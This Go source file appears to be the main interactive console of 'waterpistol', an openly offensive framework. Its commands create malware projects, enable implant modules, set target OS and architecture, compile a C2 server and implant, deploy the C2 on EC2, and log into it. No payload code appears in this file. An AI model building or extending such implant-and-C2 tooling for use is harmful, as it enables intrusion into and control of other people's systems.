package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
)

// Colour constants
const (
	RESET     = "\033[0m"
	RED       = "\033[31m"
	GREEN     = "\033[32m"
	BLUE      = "\033[34m"
	LIGHTRED  = "\033[91m"
	LIGHTBLUE = "\033[96m"
)

var HOME_DIR = os.Getenv("HOME") + "/.waterpistol/"

// Contains program settings
type waterpistol struct {
	term     *readline.Instance
	current  int
	projects []project
}

/**
Helper functions
	**/

//Remove project at index, freeing the memory
func (waterpistol *waterpistol) remove_project(index int) {
	copy(waterpistol.projects[index:], waterpistol.projects[index+1:])
	waterpistol.projects[len(waterpistol.projects)-1] = project{}
	waterpistol.projects = waterpistol.projects[:len(waterpistol.projects)-1]
}

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

// If a command fails, just exist
func checkCommand(cmd string, args ...string) string {
	out, err := exec.Command(cmd, args...).Output()

	if err != nil {
		fmt.Println("Command failed:", cmd, args)
		if out, ok := err.(*exec.ExitError); ok {
			fmt.Println(string(out.Stderr))
		}
		panic(err)
	}
	return string(out)
}

func generate_funny_name() string {
	file, err := ioutil.ReadFile("wordlist")

	if err != nil {
		panic(err)
	}
	words := strings.Split(string(file), "\n")

	num1 := rand.Intn(len(words))
	num2 := rand.Intn(len(words))

	return strings.Title(words[num1]) + strings.Title(words[num2])
}

// Other funcs
func (waterpistol *waterpistol) current_project() *project {
	if waterpistol.current == -1 || len(waterpistol.projects) == 0 {
		return nil
	}
	return &waterpistol.projects[waterpistol.current]
}

func valid_modules() []string {
	modules := []string{}

	files, err := ioutil.ReadDir("./implant/modules")
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() && strings.Compare(f.Name(), "included_modules") != 0 {
			modules = append(modules, f.Name())
		}
	}

	return modules
}

func valid_network_modules() []string {
	modules := []string{}

	files, err := ioutil.ReadDir("./implant/network_modules")
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		modules = append(modules, f.Name())
	}

	return modules
}

// Checks if settings are correct to run this program
func checkProgram() {
	// Ensure GO is installed and GOPATH is set
	cmd := exec.Command("go", "version")
	if cmd.Run() != nil {
		fmt.Println("Please make sure Go compiler is installed")
		os.Exit(1)
	}
	if len(os.Getenv("GOPATH")) == 0 {
		fmt.Println("Please make sure ENV GOPATH is set")
		os.Exit(1)
	}

	// Check we are in the go directory
	if ex, err := os.Executable(); err != nil && strings.Contains(path.Dir(ex), os.Getenv("GOPATH")) {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}

	// Check that implant/common/c2 exist
	cmd = exec.Command("ls")
	out, _ := cmd.CombinedOutput()
	outp := string(out)
	if !strings.Contains(outp, "common") ||
		!strings.Contains(outp, "c2") ||
		!strings.Contains(outp, "implant") {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}
}

/**
Autocomplete requires functions that returns an array of strings
Functions valid_* do this
*/
func (waterpistol *waterpistol) valid_disable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return waterpistol.current_project().Modules
}

func (waterpistol *waterpistol) valid_enable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return valid_modules()
}

func (waterpistol *waterpistol) valid_network(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return valid_network_modules()
}

func (waterpistol *waterpistol) valid_goos(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	keys := make([]string, len(ARCHS))

	i := 0
	for k := range ARCHS {
		keys[i] = k
		i++
	}
	return keys
}

func (waterpistol *waterpistol) valid_archs(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return VALID_ARCHS
}

// Setup readline with correct autocompleter and flags
func (waterpistol *waterpistol) setup_terminal() {
	log.SetFlags(0)
	log.SetPrefix(RED + "pistol> " + RESET)

	var completer = readline.NewPrefixCompleter(
		readline.PcItem("new"),
		readline.PcItem("compile"),
		readline.PcItem("enable", readline.PcItemDynamic(waterpistol.valid_enable)),
		readline.PcItem("disable", readline.PcItemDynamic(waterpistol.valid_disable)),
		readline.PcItem("set",
			readline.PcItem("os", readline.PcItemDynamic(waterpistol.valid_goos, readline.PcItemDynamic(waterpistol.valid_archs))),
			readline.PcItem("network", readline.PcItemDynamic(waterpistol.valid_network))),
		readline.PcItem("exit"),
		readline.PcItem("options"),
		readline.PcItem("projects"),
		readline.PcItem("project"),
		readline.PcItem("destroy"),
		readline.PcItem("login"),
	)

	l, err := readline.NewEx(&readline.Config{
		Prompt:          LIGHTBLUE + "waterpistol% " + RESET,
		HistoryFile:     "/tmp/waterpistol.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold: true,
	})

	if err != nil {
		panic(err)
	}
	log.SetOutput(l.Stderr())
	waterpistol.term = l
}

func help(incorrect_usage bool) {
	if incorrect_usage {
		fmt.Println("Incorrect Usage")
	}
	log.Println("Commands:")
	log.Println("\tnew                  -> Create a new malware project")
	log.Println("\tset os <os> <arch>   -> Set architecture and operating system for implant")
	log.Println("\tset network <module> -> Set network module")
	log.Println("\tcompile              -> Compile c2 && implant")
	log.Println("\tlogin                -> login into c2")
	log.Println("\tdestroy              -> destroy c2 instance")
	log.Println("\toptions              -> List currently enabled options")
	log.Println("\tenable <module>      -> Enable a module (tab complete)")
	log.Println("\tdisable <module>     -> Disable a module (tab complete)")
	log.Println("\tprojects             -> Show current projects")
	log.Println("\tproject <id>         -> Change to project <id>")
	log.Println("\thelp                 -> this")
}

func (waterpistol *waterpistol) handle(line string) {
	parts := strings.Split(strings.TrimSpace(line), " ")
	switch parts[0] {
	case "new":
		project := project{Name: generate_funny_name(), GOOS: DEFAULT_GOOS, GOARCH: DEFAULT_ARCH}
		waterpistol.projects = append(waterpistol.projects, project)
		waterpistol.current = len(waterpistol.projects) - 1
		log.Println("Created new project `" + project.Name + "`")
		waterpistol.term.SetPrompt(LIGHTBLUE + "waterpistol " + LIGHTRED + "<" + project.Name + ">" + LIGHTBLUE + "% " + RESET)

		os.Mkdir(HOME_DIR+project.Name, os.ModePerm)
		project.saveProject()
	case "project":
		if len(waterpistol.projects) == 0 {
			log.Println("No projects created yet")
			return
		}

		if len(parts) != 2 {
			help(true)
			return
		}

		project, err := strconv.Atoi(parts[1])
		if err != nil {
			log.Println("Project not found")
			return
		}
		if project < 0 || project >= len(waterpistol.projects) {
			log.Println("Project", project, "not found")
			return
		}
		waterpistol.current = project
		log.Println("Current Project set to", project, waterpistol.current_project().Name)

		waterpistol.term.SetPrompt(LIGHTBLUE + "waterpistol " + LIGHTRED + "<" + waterpistol.current_project().Name + ">" + LIGHTBLUE + "% " + RESET)
	case "set":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(parts) == 1 {
			log.Print("Set what?")
			return
		}

		switch parts[1] {
		case "os":
			if len(parts) != 4 {
				help(true)
				return
			}
			current_project.setArch(parts[2], parts[3])
		case "network":
			if len(parts) != 3 {
				help(true)
				return
			}
			current_project.setNetworkModule(parts[2])
		default:
			log.Print("Only valid options are os/network")
			return
		}

		current_project.saveProject()
	case "compile":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(current_project.Modules) == 0 {
			log.Print("Maybe `enable` a few modules\n")
			return
		}

		if current_project.Ip != "" {
			log.Print("This project is already compiled!!!")
			return
		}

		current_project.compile_c2_implant()
		current_project.saveProject()
	case "login":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(current_project.Ip) == 0 {
			log.Print("Maybe `compile` first\n")
			return
		}
		current_project.ssh()
	case "enable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(parts) != 2 {
			help(true)
			return
		}
		current_project.enableModule(parts[1])
		current_project.saveProject()
	case "disable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(parts) != 2 {
			help(true)
			return
		}
		current_project.disableModule(parts[1])
		current_project.saveProject()
	case "options":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		current_project.Print()
	case "destroy":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("No project selected\n")
			return
		}

		log.Println("Destroying project")
		if current_project.Ip != "" {
			log.Println("Destroying c2 && ec2 instance")
			checkCommand("cmd/c2_down", HOME_DIR+current_project.Name)
		}

		os.RemoveAll(HOME_DIR + current_project.Name)

		waterpistol.remove_project(waterpistol.current)
		waterpistol.current = -1
		waterpistol.term.SetPrompt(LIGHTBLUE + "waterpistol% " + RESET)
	case "help":
		help(false)
	case "projects":
		log.Println("Current Projects:")
		for i, project := range waterpistol.projects {
			fmt.Print(i, ": ")
			project.Print()
		}
	default:
		fmt.Println("Command not found")
		help(false)
	}
}

func (waterpistol *waterpistol) ReadUserInput() {
	for {
		line, err := waterpistol.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		waterpistol.handle(line)
	}
}

func main() {
	checkProgram()

	rand.Seed(time.Now().UTC().UnixNano())

	if os.MkdirAll(HOME_DIR, os.ModePerm) != nil {
		panic("Failed to make ~/.waterpistol directory")
	}

	waterpistol := &waterpistol{current: -1, projects: load_projects()}

	waterpistol.setup_terminal()
	log.Println("Loaded", len(waterpistol.projects), "projects!")
	defer waterpistol.term.Close()
	fmt.Println("Try `help`")
	waterpistol.ReadUserInput()
}
